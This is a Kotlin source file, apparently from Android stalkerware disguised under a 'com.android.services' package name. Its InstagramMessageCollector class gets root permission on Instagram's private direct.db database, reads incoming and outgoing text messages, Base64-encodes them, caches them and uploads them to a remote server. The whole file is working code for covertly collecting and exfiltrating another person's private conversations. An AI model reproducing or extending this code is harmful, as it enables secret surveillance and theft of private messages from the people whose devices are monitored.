package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import com.android.services.db.entities.InstagramMessageRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission.acquireInstagramDatabasePermission
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.util.*

class InstagramMessageCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncInstagram) {
            try {
                val instagramMessageList = retrieveInstagramMessages(context, localDatabaseSource)
                if (instagramMessageList.isNotEmpty()) {
                    val startDate = instagramMessageList[instagramMessageList.size - 1].date
                    val endDate = instagramMessageList[0].date
                    val mInstagramSender = RemoteServerHelper(
                        context,
                        AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mInstagramSender.upload(instagramMessageList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE} Sync is Off")
        }
    }

    companion object {
        private fun retrieveInstagramMessages(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
        ): List<InstagramMessageRooted> {
            var instagramMessageList = ArrayList<InstagramMessageRooted>()
            try {
                acquireInstagramDatabasePermission()
                val dbPath = AppConstants.INSTAGRAM_DB_PATH + "direct.db"
                val selection: String?
                val selectionArgs: Array<String>?
                val since: String
                val maxTimeStamp = localDatabaseSource.selectInstagramRootedMaxTimeStamp() ?: "0"
                since = maxTimeStamp.toString()
                if (since.isNotEmpty() && since != "0") {
                    selection = String.format("%s > ?", "timestamp")
                    selectionArgs = arrayOf(since)
                } else {
                    selection = null
                    selectionArgs = null
                }

                val database =
                    SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY)
                val cursor = database.query("messages",
                    null,
                    selection,
                    selectionArgs,
                    null,
                    null,
                    "timestamp DESC")
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        try {
                            val messageType =
                                cursor.getString(cursor.getColumnIndex("message_type"))
                            if (messageType == "text") {
                                val messageId = cursor.getString(cursor.getColumnIndex("_id"))
                                val userId = cursor.getString(cursor.getColumnIndex("user_id"))
                                val conversationId =
                                    cursor.getString(cursor.getColumnIndex("thread_id"))
                                val textMessage = cursor.getString(cursor.getColumnIndex("text"))
                                val timeStamp = cursor.getString(cursor.getColumnIndex("timestamp"))
                                val time = timeStamp.toLong()
                                val realTime = time / 1000
                                val date = AppUtils.formatDate(realTime.toString())
                                val type = if (userId == "1") "outgoing" else "incoming"

                                val instagramMessageRooted = InstagramMessageRooted()
                                instagramMessageRooted.apply {
                                    this.conversationId = conversationId
                                    this.conversationName = ""
                                    this.message = AppUtils.convertStringToBase64(textMessage)
                                    this.type = type
                                    this.messageDatetime = date
                                    this.messageId = messageId
                                    this.timeStamp = realTime
                                    this.date = AppUtils.getDate(realTime)
                                    this.status = 0
                                }
                                instagramMessageList.add(instagramMessageRooted)
                            }
                        } catch (e: Exception) {
                            logVerbose(
                                "${AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                                throwable = e
                            )
                        }
                    }
                    cursor.close()
                }
                database.close()
                logVerbose("${AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE} rooted list = $instagramMessageList")
                if (instagramMessageList.isNotEmpty())
                    localDatabaseSource.insertInstagramMessageRooted(instagramMessageList)
                localDatabaseSource.selectInstagramMessageRooted {
                    instagramMessageList = it as ArrayList<InstagramMessageRooted>
                }
                logVerbose("${AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE} selected list = $instagramMessageList")
            } catch (e: Exception) {
                logVerbose(
                    "${AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
            return instagramMessageList
        }
    }
}